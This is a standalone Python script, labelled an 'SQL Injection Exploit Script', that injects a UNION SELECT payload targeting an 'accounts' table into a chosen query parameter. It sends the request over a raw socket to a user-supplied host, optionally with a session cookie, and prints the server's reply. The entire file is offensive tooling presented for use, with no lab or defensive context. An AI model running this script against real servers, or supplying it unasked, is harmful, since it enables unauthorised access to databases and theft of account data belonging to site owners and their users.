import socket
import argparse
import urllib.parse

# Function to create the HTTP GET request
def get_request(HOST, URL, parameter, SQL_injection, COOKIE):
    injection_encoded = urllib.parse.quote_plus(SQL_injection)  # URL-encode the SQL payload
    request = (
        "GET " + URL.replace(parameter + "=", parameter + "=" + injection_encoded) + " HTTP/1.1\r\n"
        "Host: " + HOST + "\r\n"
        "User-Agent: Mozilla/5.0\r\n"
        "Accept: text/html,application/xhtml+xml,application/xml\r\n"
        "Accept-Language: en-US,en;q=0.5\r\n"
        "Connection: keep-alive\r\n"
        "Cookie: " + COOKIE + "\r\n"
        "\r\n"
    )
    return request

# Main function
def main():
    parser = argparse.ArgumentParser(description="SQL Injection Exploit Script")
    parser.add_argument('--host', required=True, help='IP address or hostname of the target server')
    parser.add_argument('-u', required=True, help='Target URL (path after the host)')
    parser.add_argument('--param', required=True, help='Query string parameter to inject SQL')
    parser.add_argument('--cookie', default="", help='Session cookie (if required)')

    args = parser.parse_args()
    HOST = args.host
    URL = args.u
    PARAMETER = args.param
    COOKIE = args.cookie
    SQL_injection = "'UNION SELECT * FROM accounts WHERE '1'='1"

    PORT = 80  # Default HTTP port

    # Establish a TCP connection to the target server
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as tcp_socket:
        try:
            tcp_socket.connect((HOST, PORT))
            print(f"[+] Connected to {HOST}:{PORT}")
            
            # Create the HTTP GET request
            request = get_request(HOST, URL, PARAMETER, SQL_injection, COOKIE)
            print("[*] Sending request:\n")
            print(request)

            # Send the request
            tcp_socket.sendall(request.encode())

            # Receive and print the response
            print("\n[*] Server response:")
            while True:
                data = tcp_socket.recv(1024)
                if not data:
                    break
                print(data.decode(errors="ignore"))
        except Exception as e:
            print(f"[-] An error occurred: {e}")

if __name__ == "__main__":
    main()
